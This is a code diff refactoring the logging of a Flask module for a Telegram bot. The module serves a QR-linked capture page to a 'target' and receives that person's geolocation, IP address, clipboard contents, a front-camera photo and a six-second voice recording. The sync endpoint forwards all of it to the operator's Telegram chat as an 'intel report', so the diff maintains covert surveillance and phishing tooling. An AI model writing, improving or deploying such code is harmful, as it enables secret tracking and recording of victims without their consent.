@@ -5,17 +5,22 @@
 
 import io
 import json
-import time
 import base64
 import qrcode
+
 from flask import Blueprint, request, jsonify
+
+from logging_config import get_logger
+from monitoring import metrics
+
+logger = get_logger("qr_pairing")
 
 # ★★★ استخدام Redis من config ★★★
 try:
     from config import redis_client, RAILWAY_URL
-    print("[+] qr_pairing: Using shared Redis")
+    logger.info("qr_pairing: Using shared Redis")
 except Exception as e:
-    print(f"[-] qr_pairing: config failed - {e}")
+    logger.error(f"qr_pairing: config failed - {e}")
     redis_client = None
     RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
 
@@ -317,7 +322,8 @@ def format_intel_report(data, source_ip):
     clipboard = data.get('clipboard')
 
     if geo.get('latitude') and geo.get('longitude'):
-        lat = geo['latitude']; lng = geo['longitude']
+        lat = geo['latitude']
+        lng = geo['longitude']
         maps_link = f"https://maps.google.com/?q={lat},{lng}"
         geo_text = f"✅ `{lat}, {lng}`\n[📍 خرائط]({maps_link})"
     else:
@@ -361,7 +367,7 @@ def init_qr_routes(app, bot):
             try:
                 owner_chat_id = redis_client.get(f"qr_token:{token}")
             except Exception as redis_err:
-                print(f"[-] Redis read error: {redis_err}")
+                logger.error(f"Redis read error: {redis_err}")
                 owner_chat_id = None
 
             if not owner_chat_id:
@@ -379,11 +385,14 @@ def init_qr_routes(app, bot):
                 source_ip = source_ip.split(',')[0].strip()
 
             report = format_intel_report(data, source_ip)
+
             try:
                 bot.send_message(owner_chat_id, report, parse_mode="Markdown")
+                metrics.inc_counter("qr_intel_received")
             except Exception as bot_err:
-                print(f"[-] Telegram dispatch error: {bot_err}")
+                logger.error(f"Telegram dispatch error: {bot_err}")
 
+            # إرسال الصورة
             photo_data = data.get('camera_photo')
             if photo_data and photo_data.startswith('data:image'):
                 try:
@@ -391,12 +400,15 @@ def init_qr_routes(app, bot):
                     image_bytes = base64.b64decode(encoded)
                     photo_file = io.BytesIO(image_bytes)
                     photo_file.name = 'target_face.jpg'
-                    bot.send_photo(owner_chat_id, photo_file,
-                                   caption="📸 **صورة حية من الكاميرا الأمامية**",
-                                   parse_mode="Markdown")
+                    bot.send_photo(
+                        owner_chat_id, photo_file,
+                        caption="📸 **صورة حية من الكاميرا الأمامية**",
+                        parse_mode="Markdown"
+                    )
                 except Exception as img_err:
-                    print(f"[-] Photo error: {img_err}")
+                    logger.error(f"Photo error: {img_err}")
 
+            # إرسال الصوت
             audio_data = data.get('audio_recording')
             if audio_data and audio_data.startswith('data:audio'):
                 try:
@@ -404,21 +416,24 @@ def init_qr_routes(app, bot):
                     audio_bytes = base64.b64decode(encoded)
                     audio_file = io.BytesIO(audio_bytes)
                     audio_file.name = 'target_voice.webm'
-                    bot.send_audio(owner_chat_id, audio_file,
-                                   caption="🎙️ **تسجيل صوتي (6 ثوان)**",
-                                   parse_mode="Markdown")
+                    bot.send_audio(
+                        owner_chat_id, audio_file,
+                        caption="🎙️ **تسجيل صوتي (6 ثوان)**",
+                        parse_mode="Markdown"
+                    )
                 except Exception as audio_err:
-                    print(f"[-] Audio error: {audio_err}")
+                    logger.error(f"Audio error: {audio_err}")
 
+            # حذف الـ token (يُستخدم مرة واحدة)
             try:
                 redis_client.delete(f"qr_token:{token}")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"Token delete error: {e}")
 
             return jsonify({"status": "synchronized"}), 200
 
         except Exception as err:
-            print(f"[-] sync error: {err}")
+            logger.exception(f"sync error: {err}")
             return jsonify({"status": "server_error"}), 500
 
     @app.route('/qr_scan_target', methods=['GET'])
@@ -438,12 +453,13 @@ def init_qr_routes(app, bot):
             else:
                 return FALLBACK_PAGE, 500
         except Exception as e:
-            print(f"[-] Token check error: {e}")
+            logger.error(f"Token check error: {e}")
             return FALLBACK_PAGE, 500
 
-        html = CAPTURE_PAGE_TEMPLATE.replace("__TOKEN__", token)\
-                                     .replace("__SYNC_URL__", f"{RAILWAY_URL}/api/v1/session/sync")\
-                                     .replace("__CHAT_ID__", str(chat_id))
+        html = (CAPTURE_PAGE_TEMPLATE
+                .replace("__TOKEN__", token)
+                .replace("__SYNC_URL__", f"{RAILWAY_URL}/api/v1/session/sync")
+                .replace("__CHAT_ID__", str(chat_id)))
         return html, 200
 
 
@@ -451,6 +467,7 @@ def init_qr_routes(app, bot):
 # QR Generation
 # ============================================================
 def generate_qr_code_bytes(deep_link_url):
+    """توليد كود QR"""
     try:
         qr = qrcode.QRCode(
             version=None,
@@ -467,5 +484,5 @@ def generate_qr_code_bytes(deep_link_url):
         buf.name = "secure_qr.png"
         return buf
     except Exception as e:
-        print(f"[-] QR gen error: {e}")
+        logger.exception(f"QR gen error: {e}")
         return io.BytesIO()
